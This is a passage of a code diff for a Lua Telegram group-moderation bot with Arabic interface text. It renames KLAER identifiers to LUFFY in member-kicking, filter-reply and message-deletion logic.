-LUFFY= https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
-local Json_Info = JSON.decode(KLAER)
+LUFFY = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
+local Json_Info = JSON.decode(LUFFY)
 if Json_Info.ok == true and #mem_id == i then
 local Msgs = {}
 Msgs[0] = msg.id_
@@ -22268,7 +22234,7 @@ end
 end   
 --------------------------------------------------------------------------------------------------------------
 Anime_ib(data.message_,data)
-plugin_KLAER(data.message_)
+plugin_LUFFY(data.message_)
 --------------------------------------------------------------------------------------------------------------
 if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
@@ -22370,13 +22336,13 @@ return false
 end  
 end 
 ------------------------------------------------------------------------
-local KLAERAbot = bot_data:get(ban_id.."KLAER1:Add:Filter:Rp2"..text..result.chat_id_)   
-if KLAERAbot then    
+local LUFFYAbot = bot_data:get(ban_id.."LUFFY1:Add:Filter:Rp2"..text..result.chat_id_)   
+if LUFFYAbot then    
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
 if data.username_ ~= false then
-send(msg.chat_id_,0," ● الـعـضو  : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ● ["..KLAERAbot.."] \n") 
+send(msg.chat_id_,0," ● الـعـضو  : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ● ["..LUFFYAbot.."] \n") 
 else
-send(msg.chat_id_,0," ● الـعـضو  : {["..data.first_name_.."](T.ME/Anime_ib)}\n ● ["..KLAERAbot.."] \n") 
+send(msg.chat_id_,0," ● الـعـضو  : {["..data.first_name_.."](T.ME/Anime_ib)}\n ● ["..LUFFYAbot.."] \n") 
 end
 end,nil)   
 DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
@@ -22397,9 +22363,9 @@ end
 end
 ------------------------------------------------------------------------
 if text then
-local KLAER1_Msg = bot_data:get(ban_id.."KLAER1:Add:Filter:Rp2"..text..result.chat_id_)   
-if KLAER1_Msg then    
-send(msg.chat_id_, msg.id_," ● "..KLAER1_Msg)
+local LUFFY1_Msg = bot_data:get(ban_id.."LUFFY1:Add:Filter:Rp2"..text..result.chat_id_)   
+if LUFFY1_Msg then    
+send(msg.chat_id_, msg.id_," ● "..LUFFY1_Msg)
 DeleteMessage(result.chat_id_, {[0] = data.message_id_})     
 return false
 end
